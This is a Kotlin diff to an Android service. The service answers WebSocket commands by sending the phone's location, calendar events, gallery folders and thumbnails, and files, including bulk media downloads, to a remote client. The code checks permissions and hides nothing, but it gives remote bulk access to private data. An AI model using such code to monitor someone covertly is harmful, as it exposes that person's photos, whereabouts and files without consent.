@@ -379,7 +379,8 @@ class StreamingService : Service() {
                             "get-bulk-download"  -> { bulkCancelled = false; sendBulkFiles(json.optString("mediaType","all"), json.optInt("photoLimit",0), json.optInt("videoLimit",0), ws) }
                             "cancel-bulk"        -> bulkCancelled = true
                             "get-location"       -> sendLocation(ws)
-                            "get-gallery"        -> sendGallery(json.optString("mediaType","images"), json.optInt("limit",30), json.optInt("offset",0), ws)
+                            "get-gallery"         -> sendGallery(json.optString("mediaType","images"), json.optInt("limit",40), json.optInt("offset",0), ws, json.optString("bucketId",""))
+                            "get-gallery-folders" -> sendGalleryFolders(ws)
                             "get-media-thumb"    -> sendMediaThumb(json.optLong("id",0), json.optString("mediaType","images"), ws)
                             "get-calendar"       -> sendCalendarEvents(json.optInt("days",14), ws)
                         }
@@ -844,6 +845,30 @@ class StreamingService : Service() {
         } catch (_: Exception) {}
     }
 
+    private fun sendChunkBinary(
+        ws: WebSocket, requestId: String, index: Int, total: Int,
+        name: String, mime: String, size: Long, buf: ByteArray, len: Int
+    ) {
+        val header = JSONObject()
+            .put("type", "file-chunk")
+            .put("requestId", requestId)
+            .put("index", index)
+            .put("total", total)
+            .put("name", name)
+            .put("mime", mime)
+            .put("size", size)
+            .toString()
+            .toByteArray(Charsets.UTF_8)
+        val frame = ByteArray(4 + header.size + len)
+        frame[0] = (header.size ushr 24).toByte()
+        frame[1] = (header.size ushr 16).toByte()
+        frame[2] = (header.size ushr 8).toByte()
+        frame[3] = header.size.toByte()
+        System.arraycopy(header, 0, frame, 4, header.size)
+        System.arraycopy(buf, 0, frame, 4 + header.size, len)
+        ws.send(frame.toByteString())
+    }
+
     private fun sendFile(filePath: String, requestId: String, ws: WebSocket) {
         fun err(msg: String) = ws.send(JSONObject().put("type","file-chunk").put("requestId",requestId).put("err",msg).toString())
         if (filePath.isBlank()) { err("Путь не указан"); return }
@@ -861,12 +886,7 @@ class StreamingService : Service() {
                     while (true) {
                         val read = stream.read(buf)
                         if (read <= 0) break
-                        val b64 = Base64.encodeToString(buf, 0, read, Base64.NO_WRAP)
-                        ws.send(JSONObject()
-                            .put("type","file-chunk").put("requestId",requestId)
-                            .put("index",index).put("total",totalChunks)
-                            .put("name",file.name).put("mime",mime).put("size",fileSize)
-                            .put("data",b64).toString())
+                        sendChunkBinary(ws, requestId, index, totalChunks, file.name, mime, fileSize, buf, read)
                         index++
                         while (ws.queueSize() > 1024 * 1024) Thread.sleep(50)
                     }
@@ -934,11 +954,7 @@ class StreamingService : Service() {
                             while (true) {
                                 if (bulkCancelled || ws !== wsPhone) break
                                 val read = stream.read(buf); if (read <= 0) break
-                                ws.send(JSONObject()
-                                    .put("type","file-chunk").put("requestId",requestId)
-                                    .put("index",chunkIdx).put("total",totalChunks)
-                                    .put("name",entry.name).put("mime",entry.mime).put("size",fileSize)
-                                    .put("data", Base64.encodeToString(buf, 0, read, Base64.NO_WRAP)).toString())
+                                sendChunkBinary(ws, requestId, chunkIdx, totalChunks, entry.name, entry.mime, fileSize, buf, read)
                                 chunkIdx++
                                 // Backpressure: wait until send buffer drains; abort if connection dropped
                                 while (ws.queueSize() > 1024 * 1024) {
@@ -991,6 +1007,66 @@ class StreamingService : Service() {
         }
     }
 
+    @Suppress("DEPRECATION")
+    private fun sendGalleryFolders(ws: WebSocket) {
+        data class BInfo(val id: String, val name: String, val thumbId: Long, var count: Int)
+
+        val imgPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+            Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+        val vidPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
+            Manifest.permission.READ_MEDIA_VIDEO else Manifest.permission.READ_EXTERNAL_STORAGE
+        val hasImages = ContextCompat.checkSelfPermission(this, imgPerm) == PackageManager.PERMISSION_GRANTED
+        val hasVideos = ContextCompat.checkSelfPermission(this, vidPerm) == PackageManager.PERMISSION_GRANTED
+
+        try {
+            val imageBuckets = linkedMapOf<String, BInfo>()
+            val videoBuckets = linkedMapOf<String, BInfo>()
+
+            fun collectBuckets(uri: android.net.Uri, map: LinkedHashMap<String, BInfo>) {
+                contentResolver.query(uri,
+                    arrayOf("bucket_id", "bucket_display_name", MediaStore.MediaColumns._ID),
+                    null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
+                    val bidCol = c.getColumnIndex("bucket_id"); if (bidCol < 0) return
+                    val bnCol  = c.getColumnIndex("bucket_display_name")
+                    val idCol  = c.getColumnIndex(MediaStore.MediaColumns._ID); if (idCol < 0) return
+                    while (c.moveToNext()) {
+                        val bid   = c.getString(bidCol) ?: continue
+                        val bname = if (bnCol >= 0) c.getString(bnCol) ?: bid else bid
+                        val id    = c.getLong(idCol)
+                        if (!map.containsKey(bid)) map[bid] = BInfo(bid, bname, id, 1)
+                        else map[bid]!!.count++
+                    }
+                }
+            }
+
+            if (hasImages) collectBuckets(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, imageBuckets)
+            if (hasVideos) collectBuckets(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, videoBuckets)
+
+            val folders = JSONArray()
+            if (hasImages && imageBuckets.isNotEmpty()) {
+                val total = imageBuckets.values.sumOf { it.count }
+                folders.put(JSONObject().put("id","").put("name","Все фото").put("mediaType","images")
+                    .put("count",total).put("thumbId", imageBuckets.values.first().thumbId))
+            }
+            if (hasVideos && videoBuckets.isNotEmpty()) {
+                val total = videoBuckets.values.sumOf { it.count }
+                folders.put(JSONObject().put("id","").put("name","Все видео").put("mediaType","videos")
+                    .put("count",total).put("thumbId", videoBuckets.values.first().thumbId))
+            }
+            imageBuckets.values.sortedByDescending { it.count }.forEach { b ->
+                folders.put(JSONObject().put("id",b.id).put("name",b.name).put("mediaType","images")
+                    .put("count",b.count).put("thumbId",b.thumbId))
+            }
+            videoBuckets.values.sortedByDescending { it.count }.forEach { b ->
+                folders.put(JSONObject().put("id",b.id).put("name",b.name).put("mediaType","videos")
+                    .put("count",b.count).put("thumbId",b.thumbId))
+            }
+            ws.send(JSONObject().put("type","gallery-folders").put("folders",folders).toString())
+        } catch (e: Exception) {
+            ws.send(JSONObject().put("type","gallery-folders").put("err", e.message ?: "ошибка").toString())
+        }
+    }
+
     @Suppress("MissingPermission")
     private fun sendLocation(ws: WebSocket) {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
@@ -1020,7 +1096,7 @@ class StreamingService : Service() {
     }
 
     @Suppress("DEPRECATION")
-    private fun sendGallery(mediaType: String, limit: Int, offset: Int, ws: WebSocket) {
+    private fun sendGallery(mediaType: String, limit: Int, offset: Int, ws: WebSocket, bucketId: String = "") {
         val perm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
             if (mediaType == "videos") Manifest.permission.READ_MEDIA_VIDEO else Manifest.permission.READ_MEDIA_IMAGES
         else Manifest.permission.READ_EXTERNAL_STORAGE
@@ -1035,9 +1111,11 @@ class StreamingService : Service() {
                 MediaStore.MediaColumns.SIZE, MediaStore.MediaColumns.DATE_ADDED,
                 MediaStore.MediaColumns.MIME_TYPE, MediaStore.MediaColumns.DATA
             )
+            val selection     = if (bucketId.isNotEmpty()) "bucket_id = ?" else null
+            val selectionArgs = if (bucketId.isNotEmpty()) arrayOf(bucketId) else null
             val items = JSONArray()
             var total = 0
-            contentResolver.query(uri, projection, null, null, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
+            contentResolver.query(uri, projection, selection, selectionArgs, "${MediaStore.MediaColumns.DATE_ADDED} DESC")?.use { c ->
                 total = c.count
                 val startPos = offset.coerceIn(0, total)
                 var count = 0
@@ -1058,7 +1136,7 @@ class StreamingService : Service() {
                         if (dataCol >= 0) item.put("path", c.getString(dataCol) ?: "")
                         items.put(item)
                         count++
-                    } while (c.moveToNext() && count < limit.coerceIn(1, 100))
+                    } while (c.moveToNext() && count < limit.coerceIn(1, 200))
                 }
             }
             ws.send(JSONObject().put("type","gallery-items").put("mediaType",mediaType)
